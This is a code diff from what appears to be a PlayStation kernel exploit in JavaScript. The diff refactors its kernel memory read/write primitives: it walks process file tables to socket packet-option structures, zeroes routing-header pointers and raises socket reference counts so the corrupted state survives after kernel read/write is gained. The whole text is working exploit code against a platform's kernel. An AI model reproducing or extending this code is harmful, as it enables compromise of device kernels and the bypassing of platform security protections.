@@ -1177,37 +1177,28 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
 
-
-    
- 
-
-    const kmrw  = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
-
-  const { read64, write64, read32, write32 } = kmrw ;
   const {
     CURPROC_OFILES,
     SIZEOF_OFILES,
     SO_PCB,
     INPCB_PKTOPTS
   } = kernel_offset;
+
     
  
     
-function get_sock_pktopts(sock, read_fn) {
-  const sock_data = get_fd_data_addr(sock, read_fn);
-  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
-  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
-}
-
-    const ofiless = kread64(p_fd);
+ function get_sock_pktopts(sock) {
+    const sock_data = get_fd_data_addr(sock);
+    const pcb       = kmem.read64(sock_data + BigInt(SO_PCB));
+    return kmem.read64(pcb       + BigInt(INPCB_PKTOPTS));
+  }
 
 
-function get_fd_data_addr(sock, read_fn) {
-
-  const filep = read_fn(ofiless + BigInt(sock) * 8n);
- 
-  return read_fn(filep + 0n);
-}
+  function get_fd_data_addr(sock) {
+    
+    const filep = kmem.read64(ofiles + BigInt(sock) * 8n);
+    return kmem.read64(filep + 0n);
+  }
 
 
     
@@ -1513,27 +1504,24 @@ function get_fd_data_addr(sock, read_fn) {
 
 
 
-    
-    for (let i = 0; i < sds.length; i++) {
-  const pkto = get_sock_pktopts(sds[i], read64);
-  write64(pkto + off_ip6po_rthdr, 0n);
-}
-// e per reclaim/worker
-write64(get_sock_pktopts(reclaim_sock, read64) + off_ip6po_rthdr, 0n);
-write64(worker_pktopts + off_ip6po_rthdr,             0n);
+  for (let i = 0; i < sds.length; i++) {
+    const pkto = get_sock_pktopts(sds[i]);
+    kmem.write64(pkto + off_ip6po_rthdr, 0n);
+  }
+  kmem.write64(get_sock_pktopts(reclaim_sock) + off_ip6po_rthdr, 0n);
+  kmem.write64(worker_pktopts + off_ip6po_rthdr,          0n);
 
-// Bump so_count per evitare free accidentali
-const sock_increase_ref = [
-  ipv6_kernel_rw.data.master_sock,
-  ipv6_kernel_rw.data.victim_sock,
-  main_sock,
-  worker_sock,
-  reclaim_sock
-];
-for (const sd of sock_increase_ref) {
-  const sock_addr = get_fd_data_addr(sd, read64);
-  write32(sock_addr + 0n, 0x100);
-}
+  const sock_increase_ref = [
+    ipv6_kernel_rw.data.master_sock,
+    ipv6_kernel_rw.data.victim_sock,
+    main_sock,
+    worker_sock,
+    reclaim_sock,
+  ];
+  for (const sd of sock_increase_ref) {
+    const sock_addr = get_fd_data_addr(sd);
+    kmem.write32(sock_addr + 0n, 0x100);
+  }
     log("fixes applied");
 
     
